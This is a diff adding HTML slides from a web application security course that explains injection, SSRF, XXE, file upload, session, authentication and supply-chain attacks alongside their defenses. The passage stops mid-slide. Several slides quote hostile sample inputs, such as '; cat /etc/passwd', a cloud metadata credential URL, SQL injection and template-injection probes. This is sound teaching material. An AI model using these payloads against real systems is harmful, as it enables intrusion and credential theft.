+<!-- ==================== SLIDE 14 -- INJECTION ATTACK FAMILY ==================== -->
+<section class="slide" id="slide-14">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 14 of 35</div>
+        <div class="slide-title">The Injection <span class="accent">Attack Family</span></div>
+        <div class="slide-subtitle">SQL injection is one member. The underlying pattern -- user input interpreted as code -- applies across many contexts.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">LDAP Injection</div>
+                <div class="card-desc">Input is unsafely inserted into an LDAP query. Attackers modify the query to bypass authentication or enumerate directory entries. LDAP special characters (* ( ) \ / NUL) must be escaped. LDAP injection is less common than SQLi but follows identical principles. Affects applications using directory services for authentication.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Command Injection (OS Injection)</div>
+                <div class="card-desc">Input is passed to a system shell (exec, system, popen). The attacker appends shell metacharacters: semicolons, pipes, backticks. Payload: <span class="ic">; cat /etc/passwd</span>. Command injection gives direct OS code execution -- it is one of the most critical vulnerabilities. Avoid shell calls entirely; use library functions instead.</div>
+            </div>
+            <div class="card c-purple">
+                <div class="card-label">XML/XPath Injection</div>
+                <div class="card-desc">Applications using XPath to query XML data are vulnerable if input is concatenated into the XPath expression. Similar to SQLi mechanics but for XML document traversal. The attacker can read arbitrary nodes from the XML document. Parameterized XPath queries (where supported) and strict input validation are the defenses.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Universal Injection Defense</div>
+            Separate code from data. Use parameterized interfaces (prepared statements, parameterized XPath, sanitized LDAP filters). Validate input type and range. Reject inputs containing metacharacters when no legitimate use case exists for them. Never pass user input to an interpreter without explicit validation and escaping.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 15 -- SESSION ATTACKS ==================== -->
+<section class="slide" id="slide-15">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 15 of 35</div>
+        <div class="slide-title">Session <span class="accent">Attacks</span></div>
+        <div class="slide-subtitle">Session tokens are the keys to authenticated state. Stealing or predicting them bypasses authentication entirely.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">Session Hijacking</div>
+                <div class="card-desc">Attacker obtains a valid session token and uses it to impersonate the authenticated user. Token obtained via XSS (document.cookie theft), network sniffing (unencrypted HTTP), or server-side storage theft. Once the token is presented, the server has no way to distinguish the attacker from the legitimate user.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Session Fixation</div>
+                <div class="card-desc">Attacker forces the victim to use a session ID chosen by the attacker. The attacker provides a link with a pre-set session ID (SID=attacker-chosen-value). The victim authenticates with this ID. The attacker then uses the same ID -- it is now elevated to an authenticated session. Defense: regenerate session ID on login.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Token Prediction</div>
+                <div class="card-desc">Session tokens generated with weak or predictable random sources can be brute-forced or predicted. Sequential IDs (session=1001, session=1002) are trivially enumerable. Tokens based on timestamp XOR user ID are guessable. Tokens must be generated from a cryptographically secure random number generator (CSPRNG), not from predictable data.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Defense: Secure Session Management</div>
+                <div class="card-desc">128-bit+ CSPRNG-generated tokens. HttpOnly and Secure flags on session cookies. Session timeout and idle timeout. Regenerate session ID on privilege elevation (login, sudo, checkout). Bind session to user agent and IP (with awareness of mobile/VPN user impact). Invalidate all sessions on password change.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 16 -- INSECURE DIRECT OBJECT REFERENCE ==================== -->
+<section class="slide" id="slide-16">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 16 of 35</div>
+        <div class="slide-title">Insecure Direct Object <span class="accent">Reference (IDOR)</span></div>
+        <div class="slide-subtitle">The application exposes internal object references in URLs or parameters, and fails to verify the requester owns the object.</div>
+
+        <div class="scenario-strip">
+            Researcher R-202 requests their specimen report at: /reports/download?id=8841. They notice the URL and try: /reports/download?id=8840. The server returns another researcher's confidential report without any authorization check. IDOR is horizontal privilege escalation through reference manipulation -- no exploit required, just changing a number.
+        </div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">Why It Occurs</div>
+                <div class="card-desc">Developers trust that users will only request their own objects. They authenticate the user but forget to verify that the authenticated user is authorized to access the specific object requested. Authentication proves identity. Authorization proves the right to access a specific resource. Both are required on every access.</div>
+            </div>
+            <div class="card c-green">
+                <div class="card-label">Defense: Server-Side Authorization</div>
+                <div class="card-desc">Every access to an object must verify: does this authenticated user have permission to access this specific object? The check must happen on the server, every time, for every request. Client-side "hiding" of links to objects the user does not own is not a security control -- it is merely UI cosmetics.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Indirect References</div>
+            Replace direct database IDs with indirect references: a per-user mapping table that translates a user-scoped reference (file=3 in the user's namespace) to the actual database row. The user never sees or manipulates real IDs. Even if they tamper with the reference, they can only reach objects in their own namespace.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 17 -- FILE UPLOAD ATTACKS ==================== -->
+<section class="slide" id="slide-17">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 17 of 35</div>
+        <div class="slide-title">File Upload <span class="accent">Attacks</span></div>
+        <div class="slide-subtitle">File upload functionality is one of the most dangerous features to implement. Unrestricted file upload is a critical severity finding.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Web Shell Upload</div>
+                <div class="card-desc">The attacker uploads a file with a server-side scripting extension (.php, .asp, .jsp). If stored in a web-accessible directory and executed by the web server, it creates a persistent backdoor. The web shell accepts commands over HTTP, providing OS code execution without any additional exploit. Direct path to full compromise.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Content-Type Bypass</div>
+                <div class="card-desc">Server validates the MIME type from the Content-Type header -- a value the attacker fully controls. Changing Content-Type from application/x-php to image/jpeg is trivial with any proxy tool. File extension checks can be bypassed with double extensions (shell.php.jpg), null bytes (shell.php%00.jpg), or alternate extensions (.phtml, .phar).</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Defense: Multi-Layer File Validation</div>
+                <div class="card-desc">Validate file type by content inspection (magic bytes), not by Content-Type header or file extension alone. Rename uploaded files to a random UUID before storage -- strip the original extension entirely. Never store uploads in a web-accessible directory. Strip EXIF and metadata. Serve files through a dedicated handler, not directly by the web server.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 18 -- XML AND API ATTACKS ==================== -->
+<section class="slide" id="slide-18">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 18 of 35</div>
+        <div class="slide-title">XML and <span class="accent">API Attacks</span></div>
+        <div class="slide-subtitle">Modern applications expose XML parsers and REST/SOAP APIs -- each with its own attack surface.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">XXE -- XML External Entity</div>
+                <div class="card-desc">XML parsers support entity definitions that reference external resources. An attacker injects an entity referencing a local file (file:///etc/passwd) or an internal network resource. The parser fetches and includes the content in the response. XXE can read files, perform SSRF, and in some configurations enable denial of service (billion laughs).</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">API Broken Object Level Authorization</div>
+                <div class="card-desc">REST APIs that expose object IDs without server-side authorization checks are vulnerable at scale. GET /api/users/1234/profile returns any user's profile when the ID is changed. API authorization is frequently weaker than web UI authorization because APIs are developed faster and tested less rigorously. OWASP API Security Top 10 leads with this class.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Mass Assignment</div>
+                <div class="card-desc">Frameworks automatically bind request parameters to object properties. An attacker adds fields not present in the form: POST /register includes ?role=admin. If the framework binds all parameters to the user object, the attacker self-assigns admin. Defense: use allowlists of permitted properties; never bind all request parameters to objects automatically.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">XXE Defense</div>
+                <div class="card-desc">Disable external entity processing in the XML parser. In Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false). In PHP: libxml_disable_entity_loader(true). External entity processing serves no legitimate purpose in most applications. Disable it at the parser level; do not attempt to filter at the input level.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 19 -- SERVER-SIDE REQUEST FORGERY ==================== -->
+<section class="slide" id="slide-19">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 19 of 35</div>
+        <div class="slide-title">Server-Side Request Forgery <span class="accent">(SSRF)</span></div>
+        <div class="slide-subtitle">The attacker tricks the server into making HTTP requests to attacker-specified destinations, using the server as a proxy.</div>
+
+        <div class="scenario-strip">
+            The facility's specimen image fetcher accepts a URL parameter: /fetch?url=https://public-image-host.com/image.jpg. The attacker submits: /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/. The server is an AWS EC2 instance. The IMDS endpoint returns IAM credentials. The attacker now has cloud credentials with whatever permissions the EC2 role holds.
+        </div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">Internal Network Scanning</div>
+                <div class="card-desc">SSRF turns a public-facing server into a port scanner and HTTP proxy for the internal network. The attacker requests http://10.0.0.1:22, http://10.0.0.1:3306, iterating IPs and ports. The server's response (connection refused vs. timeout vs. 200 OK) reveals the internal network topology and open services.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Cloud Metadata Service Abuse</div>
+                <div class="card-desc">Cloud providers offer instance metadata at link-local addresses (AWS: 169.254.169.254, GCP: 169.254.169.254, Azure: 169.254.169.254). These endpoints return credentials, instance configuration, and network details. SSRF against cloud metadata services is one of the most critical vectors in cloud-hosted applications.</div>
+            </div>
+        </div>
+
+        <div class="box box-green">
+            <div class="box-label">SSRF Defense</div>
+            Validate and allowlist URLs against a strict set of permitted destinations. Block requests to RFC 1918 addresses (10.x, 172.16-31.x, 192.168.x), loopback (127.x), and link-local (169.254.x). Disable redirects or re-validate the final destination after following redirects. In cloud: use IMDSv2 (requires PUT before GET, preventing SSRF) and restrict EC2 role permissions.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 20 -- INPUT VALIDATION STRATEGY ==================== -->
+<section class="slide" id="slide-20">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 20 of 35</div>
+        <div class="slide-title">Input Validation <span class="accent">Strategy</span></div>
+        <div class="slide-subtitle">The primary defense against all injection classes. Validation must be comprehensive, consistent, and server-side.</div>
+
+        <div class="card-grid">
+            <div class="card c-green">
+                <div class="card-label">Allowlisting over Denylisting</div>
+                <div class="card-desc">Define what is acceptable and reject everything else. A field expecting a US phone number should accept only digits, spaces, dashes, and parentheses -- 10-12 characters. Denylisting attempts to enumerate all bad inputs, which always fails. Attackers find new encodings and sequences that bypass the denylist. Allowlists are provably correct.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Validate on the Server</div>
+                <div class="card-desc">Client-side validation (JavaScript) is a UX convenience, not a security control. Any attacker with a proxy tool (Burp Suite, OWASP ZAP) intercepts the request after client-side validation and modifies it before it reaches the server. Server-side validation is the only validation that counts for security purposes.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Context-Specific Encoding</div>
+                <div class="card-desc">The same input may need different encoding depending on where it is used. User-controlled data in HTML context requires HTML encoding. In JavaScript context: JS encoding. In SQL: parameterized query. In URL: URL encoding. Using the wrong encoding for the context leaves the application vulnerable even with encoding in place.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Defense in Depth for Input</div>
+            Layer defenses: input validation at the application layer, parameterized queries at the data layer, WAF rules at the perimeter layer, CSP headers at the browser layer. No single layer catches everything. An attacker who bypasses WAF rules still faces parameterized queries. An attacker who crafts a valid query still faces database least privilege.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 21 -- WEB APPLICATION FIREWALL ==================== -->
+<section class="slide" id="slide-21">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 21 of 35</div>
+        <div class="slide-title">Web Application <span class="accent">Firewall (WAF)</span></div>
+        <div class="slide-subtitle">A WAF operates at the HTTP layer, inspecting requests and responses against a rule set. It is a compensating control, not a replacement for secure code.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-blue">
+                <div class="card-label">What a WAF Does</div>
+                <div class="card-desc">Inspects HTTP/HTTPS traffic for patterns associated with known attack signatures: SQL keywords in parameters, script tags in input, path traversal sequences, command injection metacharacters. Can operate in detection mode (log only) or blocking mode. ModSecurity with OWASP CRS is the open-source standard.</div>
+            </div>
+            <div class="card c-red">
+                <div class="card-label">WAF Limitations</div>
+                <div class="card-desc">WAFs are regularly bypassed by novel encoding, obfuscation, and attack variants not in the rule set. A WAF blocking SELECT also blocks legitimate use of that word in comments. False positive tuning is time-consuming. WAFs add latency. TLS termination must occur before WAF inspection -- creates a decryption choke point.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Positive vs. Negative Security Model</div>
+                <div class="card-desc">Negative security model (most WAFs): block known bad patterns. Positive security model: only allow known good patterns (strict allowlist at the WAF layer). Positive model is far more effective but requires extensive profiling of legitimate traffic to build the allowlist. Often used for high-value specific endpoints rather than entire applications.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">WAF in Defense in Depth</div>
+                <div class="card-desc">A WAF provides an additional layer between the attacker and the application. It can stop automated scanners, buy time during an active attack, and catch common exploitation patterns. It cannot substitute for fixing vulnerabilities in the application code. Fix the code; use the WAF as a temporary compensating control and ongoing detection layer.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 22 -- SECURE DEVELOPMENT LIFECYCLE ==================== -->
+<section class="slide" id="slide-22">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 22 of 35</div>
+        <div class="slide-title">Secure Development <span class="accent">Lifecycle (SDL)</span></div>
+        <div class="slide-subtitle">Security integrated into every phase of software development, not added after deployment.</div>
+
+        <div class="card-grid">
+            <div class="card c-blue">
+                <div class="card-label">Design Phase</div>
+                <div class="card-desc">Threat modeling: identify assets, enumerate threats, design mitigations before a line of code is written. STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) is the standard framework. Security requirements documented alongside functional requirements.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Development Phase</div>
+                <div class="card-desc">Secure coding standards, code review with security focus, static application security testing (SAST) integrated into CI/CD pipeline. SAST tools (Semgrep, SonarQube, Checkmarx) scan source code for vulnerability patterns before deployment. Developer security training reduces injection vulnerabilities at the source.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Testing Phase</div>
+                <div class="card-desc">Dynamic application security testing (DAST) probes the running application for vulnerabilities. Penetration testing before production release. Dependency scanning for known CVEs in third-party libraries. Interactive AST (IAST) instruments the running application to detect vulnerabilities during normal test execution.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Shift Left</div>
+            "Shift left" means moving security testing earlier in the development pipeline. A vulnerability found in design costs hours to fix. Found in code review: days. Found in testing: weeks. Found in production: months and incident response costs. The economic argument for shift-left security is overwhelming.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 23 -- CLICK JACKING AND UI REDRESSING ==================== -->
+<section class="slide" id="slide-23">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 23 of 35</div>
+        <div class="slide-title">Clickjacking and <span class="accent">UI Redressing</span></div>
+        <div class="slide-subtitle">The attacker overlays a transparent frame over a legitimate page, tricking the user into clicking elements they cannot see.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">How Clickjacking Works</div>
+                <div class="card-desc">The attacker loads the target site in a transparent iframe on their malicious page. A decoy UI element is positioned beneath the user's cursor. The user thinks they are clicking the attacker's button but is actually clicking the hidden iframe's button -- a "Confirm Transfer" or "Grant Permission" button on the legitimate site. No JavaScript injection required.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">X-Frame-Options Header</div>
+                <div class="card-desc">HTTP response header that controls framing. DENY: never allow this page to be framed. SAMEORIGIN: only frames from the same origin are allowed. ALLOW-FROM: specify a trusted origin (deprecated in modern browsers). All pages that perform sensitive actions should set X-Frame-Options: DENY to prevent framing entirely.</div>
+            </div>
+            <div class="card c-green">
+                <div class="card-label">CSP frame-ancestors</div>
+                <div class="card-desc">Content-Security-Policy: frame-ancestors 'none' is the modern equivalent of X-Frame-Options: DENY. CSP frame-ancestors overrides X-Frame-Options in browsers that support CSP Level 2+. Setting both provides defense in depth for older browsers. This directive blocks the page from being loaded inside any iframe.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Scope of Damage</div>
+                <div class="card-desc">Any authenticated action can be triggered by clickjacking: deleting an account, authorizing an OAuth application, posting content, confirming a financial transaction. Particularly dangerous on admin interfaces where a single click can have high-impact consequences. Social engineering lure pages make the attack highly effective against non-technical users.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 24 -- ERROR HANDLING AND INFORMATION DISCLOSURE ==================== -->
+<section class="slide" id="slide-24">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 24 of 35</div>
+        <div class="slide-title">Error Handling and <span class="accent">Information Disclosure</span></div>
+        <div class="slide-subtitle">Verbose error messages are reconnaissance gifts. Applications must fail gracefully without revealing internal details.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">What Verbose Errors Reveal</div>
+                <div class="card-desc">Database type and version, table and column names, file system paths, framework versions, internal IP addresses, stack traces showing code structure, configuration values. Each piece narrows the attack surface. An error revealing "MySQL 5.7.32 at /var/lib/mysql/data" tells the attacker exactly which CVEs to check for unpatched vulnerabilities.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">User-Facing vs. Internal Errors</div>
+                <div class="card-desc">User-facing errors should be generic: "An error occurred. Please try again." or "Request ID 8af3b2 -- contact support." Detailed errors go to application logs, accessible only to operations staff. This dual-mode error handling provides operational visibility without reconnaissance value. Never expose stack traces or database errors to the end user.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Directory Listing</div>
+                <div class="card-desc">Web servers that expose directory listings when no index file exists reveal file names, backup files, configuration files, and source code. Disable directory listing on all web server configurations (Apache: Options -Indexes; Nginx: autoindex off). This is one of the most common misconfigurations found in external assessments.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 25 -- BROKEN AUTHENTICATION ==================== -->
+<section class="slide" id="slide-25">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 25 of 35</div>
+        <div class="slide-title">Broken <span class="accent">Authentication</span></div>
+        <div class="slide-subtitle">Authentication mechanisms that can be bypassed, brute-forced, or exploited to gain unauthorized access.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">Credential Stuffing</div>
+                <div class="card-desc">Automated submission of stolen username/password pairs from data breaches against a target application. Effective because users reuse credentials. Defense: rate limiting, CAPTCHA, anomaly detection on login attempts, breach detection integration (HIBP API), MFA as a backstop. Account lockout alone is insufficient due to low success rate per account.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Password Spraying</div>
+                <div class="card-desc">Attempting a small set of common passwords against a large number of accounts. Avoids account lockout thresholds by staying below the per-account attempt limit. One or two attempts per account per day against thousands of accounts. Defense: MFA, anomaly detection on distributed low-rate login attempts across many accounts.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Weak Password Reset</div>
+                <div class="card-desc">Predictable reset tokens (sequential, timestamp-derived, short), tokens that never expire, reset via guessable security questions ("your mother's maiden name"), and tokens sent to non-verified secondary contacts. Password reset is an authentication bypass path -- it must be as secure as the login itself.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Multi-Factor Authentication Bypass</div>
+                <div class="card-desc">OTP phishing (real-time proxy attack that relays credentials and OTP to the real site before the token expires). SIM swapping to receive SMS OTP. Push notification fatigue attacks (spam MFA push until user approves to stop the noise). Solution: FIDO2 hardware keys are phishing-resistant because the key verifies the site's origin.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 26 -- RACE CONDITIONS ==================== -->
+<section class="slide" id="slide-26">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 26 of 35</div>
+        <div class="slide-title">Race Conditions and <span class="accent">TOCTOU</span></div>
+        <div class="slide-subtitle">Time-of-check to time-of-use vulnerabilities exploit the window between when a condition is verified and when it is acted upon.</div>
+
+        <div class="scenario-strip">
+            The facility's specimen withdrawal system checks balance, then processes the withdrawal in two separate operations. An attacker sends two simultaneous withdrawal requests for the entire available balance. Both requests pass the balance check before either commits. Both withdrawals execute. The account is overdrawn by the full balance. Classic double-spend via race condition.
+        </div>
+
+        <div class="card-grid-2">
+            <div class="card c-red">
+                <div class="card-label">TOCTOU in File Systems</div>
+                <div class="card-desc">A program checks that a symlink points to a safe location, then opens the file. Between check and open, the attacker replaces the symlink target. The program opens a different, potentially sensitive file. Privileged setuid programs are frequent targets. Defense: open the file atomically and check permissions after opening, not before.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Double-Spend Attacks</div>
+                <div class="card-desc">Any operation that reads a value, computes a result, and writes back is vulnerable to concurrent exploitation. Database transactions with proper isolation levels (SERIALIZABLE) prevent this. Application-level locks, database row-level locking (SELECT FOR UPDATE), and atomic compare-and-swap operations eliminate the window.</div>
+            </div>
+        </div>
+
+        <div class="box box-blue">
+            <div class="box-label">Defense: Atomic Operations and Transactions</div>
+            Combine check and act into a single atomic operation. At the database level: use transactions with appropriate isolation, row locking, and optimistic concurrency control. At the OS level: use open() with O_NOFOLLOW and O_CLOEXEC to prevent symlink attacks. At the application level: avoid read-modify-write patterns without exclusive locks.
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 27 -- PROTOTYPE POLLUTION AND DESERIALIZATION ==================== -->
+<section class="slide" id="slide-27">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 27 of 35</div>
+        <div class="slide-title">Deserialization and <span class="accent">Modern Injection Vectors</span></div>
+        <div class="slide-subtitle">Advanced injection classes that exploit language-level features rather than string concatenation.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Insecure Deserialization</div>
+                <div class="card-desc">Applications that deserialize untrusted data can be exploited when the deserialization process itself executes code. Java, PHP, Python pickle, and Ruby Marshal all support native serialization. Gadget chains combine existing classes to achieve arbitrary code execution during deserialization. Never deserialize data from untrusted sources using native serializers.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Prototype Pollution (JavaScript)</div>
+                <div class="card-desc">JavaScript objects inherit from prototypes. If an attacker can set properties on Object.prototype (via unsanitized merge operations: merge(obj, JSON.parse(untrustedInput))), those properties appear on all objects in the application. This can bypass security checks that rely on property existence, enable code execution via property injection, or cause denial of service.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Template Injection (SSTI)</div>
+                <div class="card-desc">Server-side template engines (Jinja2, Twig, Pebble, Freemarker) evaluate expressions in templates. If user input is rendered inside a template without sanitization, the attacker can inject template expressions that execute server-side code. Jinja2: {{7*7}} returns 49 -- confirming SSTI. Then: {{config.items()}} enumerates app config. Leads to RCE.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 28 -- APPLICATION SECURITY TESTING ==================== -->
+<section class="slide" id="slide-28">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 28 of 35</div>
+        <div class="slide-title">Application Security <span class="accent">Testing</span></div>
+        <div class="slide-subtitle">Systematic methods for discovering vulnerabilities before attackers do. Each method has a different detection profile.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-blue">
+                <div class="card-label">SAST -- Static Analysis</div>
+                <div class="card-desc">Analyzes source code without executing it. Detects SQL concatenation patterns, unsanitized output, hard-coded credentials, dangerous function calls. Runs in CI/CD pipeline -- results appear in minutes. High false positive rate requires tuning. Cannot detect logic flaws or runtime-only vulnerabilities. Low barrier to adoption.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">DAST -- Dynamic Analysis</div>
+                <div class="card-desc">Probes the running application by sending malicious inputs and observing responses. Detects XSS, SQLi, IDOR, SSRF, and configuration issues that only manifest at runtime. Requires a deployed test environment. Slower than SAST. Finds different vulnerability classes. OWASP ZAP and Burp Suite Professional are standard tools.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">SCA -- Software Composition Analysis</div>
+                <div class="card-desc">Scans third-party dependencies and open-source libraries for known CVEs. The majority of modern application code is third-party. A single vulnerable transitive dependency can expose the entire application. SCA tools (Dependabot, Snyk, Black Duck) alert on new CVEs published for used dependencies. Integrate into CI/CD for continuous monitoring.</div>
+            </div>
+            <div class="card c-purple">
+                <div class="card-label">Penetration Testing</div>
+                <div class="card-desc">Human attackers simulate adversarial behavior against the full application stack. Finds business logic flaws, authentication bypasses, and attack chains that automated tools miss. Scope is defined in writing (Rules of Engagement). Black box (no prior knowledge), white box (source code provided), gray box (partial knowledge like a registered user). Required for compliance in many frameworks.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 29 -- SUPPLY CHAIN ATTACKS ==================== -->
+<section class="slide" id="slide-29">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 29 of 35</div>
+        <div class="slide-title">Supply Chain <span class="accent">Attacks</span></div>
+        <div class="slide-subtitle">Compromise a trusted dependency, build tool, or update mechanism to reach the final target through its own supply chain.</div>
+
+        <div class="card-grid">
+            <div class="card c-red">
+                <div class="card-label">Dependency Confusion</div>
+                <div class="card-desc">An attacker publishes a malicious package to a public registry (npm, PyPI) with the same name as an internal private package, but with a higher version number. If the build system checks the public registry first (or at all), it downloads and executes the malicious package. SolarWinds, Codecov, and event-stream are well-documented examples of supply chain compromise.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">Malicious Package Publication</div>
+                <div class="card-desc">Attackers publish packages with names similar to popular packages (typosquatting: reqeusts vs. requests), take over abandoned packages, or compromise maintainer accounts. A malicious package installed during build or at runtime has full access to the application's environment, credentials, and data. npm install with sudo is particularly dangerous.</div>
+            </div>
+            <div class="card c-blue">
+                <div class="card-label">Defense</div>
+                <div class="card-desc">Pin exact dependency versions (lockfiles). Verify package integrity using checksums (npm integrity hashes, pip hash-checking mode). Use private package mirrors. Review dependencies before initial adoption. Monitor CVE databases for used packages. Sign and verify build artifacts. Apply SLSA (Supply chain Levels for Software Artifacts) framework principles.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 30 -- COMMON VULNERABILITY SCORING ==================== -->
+<section class="slide" id="slide-30">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 30 of 35</div>
+        <div class="slide-title">Vulnerability <span class="accent">Scoring and Prioritization</span></div>
+        <div class="slide-subtitle">Not all vulnerabilities are equal. CVSS provides a standardized framework for communicating severity and prioritizing remediation.</div>
+
+        <div class="card-grid-2">
+            <div class="card c-blue">
+                <div class="card-label">CVSS v3.1 Base Score</div>
+                <div class="card-desc">Common Vulnerability Scoring System. Attack Vector (Network/Adjacent/Local/Physical), Attack Complexity, Privileges Required, User Interaction, Scope, Confidentiality/Integrity/Availability Impact. Scores range 0.0-10.0. Critical: 9.0-10.0. High: 7.0-8.9. Medium: 4.0-6.9. Low: 0.1-3.9. None: 0.0.</div>
+            </div>
+            <div class="card c-red">
+                <div class="card-label">Temporal and Environmental Metrics</div>
+                <div class="card-desc">Temporal metrics adjust score based on exploit availability and patch status. Environmental metrics adjust for the specific organization's context -- a vulnerability affecting a system with no sensitive data scores lower environmentally. CVSS is a starting point for prioritization, not a final answer. Business context matters.</div>
+            </div>
+            <div class="card c-gold">
+                <div class="card-label">CVE and NVD</div>
+                <div class="card-desc">CVE (Common Vulnerabilities and Exposures) assigns unique identifiers to publicly disclosed vulnerabilities. NVD (National Vulnerability Database) enriches CVEs with CVSS scores, CWE classifications, and references. MITRE maintains the CVE program. Security tools use CVE IDs for consistent cross-reference. Know how to look up a CVE by ID.</div>
+            </div>
+            <div class="card c-cyan">
+                <div class="card-label">Risk-Based Prioritization</div>
+                <div class="card-desc">Patch High/Critical vulnerabilities in externally accessible, privileged, or data-handling systems first. CVSS score alone is insufficient -- a CVSS 9.0 on an isolated dev server is less urgent than a CVSS 7.0 on a public-facing authentication endpoint. Add exploitability context (is there a working public exploit?) and asset criticality to the scoring matrix.</div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ==================== SLIDE 31 -- CDC SCENARIO: APPLICATION BREACH ==================== -->
+<section class="slide" id="slide-31">
+    <div class="slide-inner">
+        <div class="slide-meta">Slide 31 of 35</div>
+        <div class="slide-title">CDC Scenario: <span class="accent">Research Portal Breach</span></div>
+        <div class="slide-subtitle">Apply the full attack taxonomy to a facility scenario. Identify each attack type, the defense that failed, and the correct remediation.</div>
+
+        <div class="summary-facts">
+            <div class="fact-row">
+                <span class="fact-num">1</span>
+                <span class="fact-text">Attacker enters <code>' OR '1'='1</code> in the specimen ID field and receives the full specimen manifest. Attack: Classic SQLi. Failed control: input validation, parameterized queries. Remediation: parameterize all database queries immediately.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">2</span>
+                <span class="fact-text">The researcher comment board displays a script tag that steals cookies from every visitor. Attack: Stored XSS. Failed control: output encoding, CSP. Remediation: encode all output in HTML context; add Content-Security-Policy: script-src 'self' header.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">3</span>
+                <span class="fact-text">A researcher clicks a link in an email; a specimen transfer is submitted on their behalf. Attack: CSRF. Failed control: CSRF token, SameSite cookie. Remediation: add CSRF token to all state-changing forms; set SameSite=Strict on session cookie.</span>
+            </div>
+            <div class="fact-row">
+                <span class="fact-num">4</span>
